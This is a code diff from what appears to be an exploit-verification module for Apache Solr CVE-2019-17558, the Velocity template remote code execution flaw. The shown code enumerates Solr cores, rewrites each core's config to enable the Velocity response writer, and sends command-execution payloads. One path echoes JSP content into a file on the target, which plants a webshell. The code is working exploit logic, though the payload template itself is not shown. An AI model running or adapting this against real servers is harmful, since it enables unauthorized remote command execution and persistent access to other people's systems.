@@ -26,33 +26,6 @@ class CVE_2019_17558_BaseVerify:
             jsp_data = reader.read()
         self.jsp_payload = self.payload.format(cmd = 'echo %s > %s.jsp' %(jsp_data, 'test'))
 
-    async def check(self, send_payload = None):
-       
-        """
-        检测是否存在漏洞
-
-        :param:
-
-        :return bool True or False: 是否存在漏洞
-        """
-
-        try:
-            if not send_payload:
-                send_payload = self.payload.format(cmd = 'whomai')
-            core_url = self.url + '/solr/admin/cores?_=1572502179076&indexInfo=false&wt=json'
-            req = await request.get(core_url, headers = self.headers)
-            if req.status == 200 and 'responseHeader' in await req.text() and 'status' in await req.text():
-                json_str = json.loads(await req.text())
-                for i in json_str['status']:
-                    core_name_url = self.url + '/solr/' + i + '/config'
-                    result = await self.update_queryresponsewriter(core_name_url, send_payload)
-                    if result:
-                        return result
-
-        except Exception as e:
-            # print(e)
-            pass
-
     async def update_queryresponsewriter(self, core_name_url, send_payload):
 
         '''
@@ -80,11 +53,40 @@ class CVE_2019_17558_BaseVerify:
             check_payload = self.payload.format(cmd = 'echo ' + self.capta + 'win^dowslin$1ux')
             check_req = await request.get(exp_url + check_payload, headers = self.headers)
             if check_req.status == 200 and self.capta in await check_req.text():
-                cmd_req = await request.get(exp_url + send_payload, headers = self.headers)
-                if cmd_req.status == 500 and send_payload == self.jsp_payload:
-                    return '存在漏洞'
-                result = await cmd_req.text()
-                return result.strip()
+                if send_payload:
+                    cmd_req = await request.get(exp_url + send_payload, headers = self.headers)
+                    if cmd_req.status == 500 and send_payload == self.jsp_payload:
+                        return '存在漏洞'
+                    result = await cmd_req.text()
+                    return result.strip()
+                else:
+                    return True
+    
+    async def check(self, send_payload = None):
+       
+        """
+        检测是否存在漏洞
+
+        :param:
+
+        :return bool True or False: 是否存在漏洞
+        """
+
+        try:
+            if not send_payload:
+                send_payload = self.payload.format(cmd = 'whomai')
+            core_url = self.url + '/solr/admin/cores?_=1572502179076&indexInfo=false&wt=json'
+            req = await request.get(core_url, headers = self.headers)
+            if req.status == 200 and 'responseHeader' in await req.text() and 'status' in await req.text():
+                json_str = json.loads(await req.text())
+                for i in json_str['status']:
+                    core_name_url = self.url + '/solr/' + i + '/config'
+                    result = await self.update_queryresponsewriter(core_name_url, send_payload)
+                    if result:
+                        return result
+        except Exception as e:
+            # print(e)
+            pass
 
 if __name__ == '__main__':
     CVE_2019_17558 = CVE_2019_17558_BaseVerify('http://127.0.0.1:8983')
